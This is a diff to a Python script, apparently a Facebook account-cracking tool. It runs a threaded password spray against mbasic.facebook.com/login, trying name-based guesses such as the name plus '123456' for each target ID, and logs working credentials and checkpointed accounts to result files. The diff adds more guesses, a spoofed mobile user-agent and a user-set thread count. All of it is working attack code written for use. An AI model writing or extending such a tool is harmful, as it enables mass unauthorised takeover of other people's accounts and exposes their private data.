@@ -23,10 +23,10 @@ class AutoB:
 
 	def attk(self,idd,name):
 		try:
-			lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345',self.spas]
+			lid=[name+'123',name+'12345',name+'123456',name.lower()+'123',name.lower()+'12345',name.lower()+'123456',self.spas]
 			for x in lid:
 				data={'email':idd,'pass':x}
-				re=requests.post('https://mbasic.facebook.com/login',data=data).text
+				re=requests.post('https://mbasic.facebook.com/login',data=data,headers={'user-agent':'Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16'}).text
 				if 'save-device' in re or 'm_sess' in re:
 					self.fnd+=1
 					pen=open('result/found.txt','a')
@@ -37,9 +37,9 @@ class AutoB:
 					pen=open('result/cek.txt','a')
 					pen.write(f'{idd}|{x}\n')
 					break
+			self.hit+=1
+			print(f'\r[CRACK] >> {self.hit}/{len(self.tar)} F[{self.fnd}] CP[{self.cek}] <<',end='')
 		except: pass
-		self.hit+=1
-		print(f'\r[CRACK] >> {self.hit}/{len(self.tar)} F[{self.fnd}] CP[{self.cek}] <<',end='')
 
 	def main(self):
 		try:
@@ -61,10 +61,10 @@ class AutoB:
 			self.spas=input('[?] Extra password: ')
 		else:
 			self.spas=''
-		print()
 		for x in file:
 			self.tar.append(x)
-		p=ThreadPool(50)
+		p=ThreadPool(int(input("[?] Threads 1-100: ")))
+		print()
 		p.map(self.nama,self.tar)
 		if self.fnd > 0 or self.cek > 0:
 			print("\nFound ["+str(self.fnd)+"] CheckPoint ["+str(self.cek)+"]")
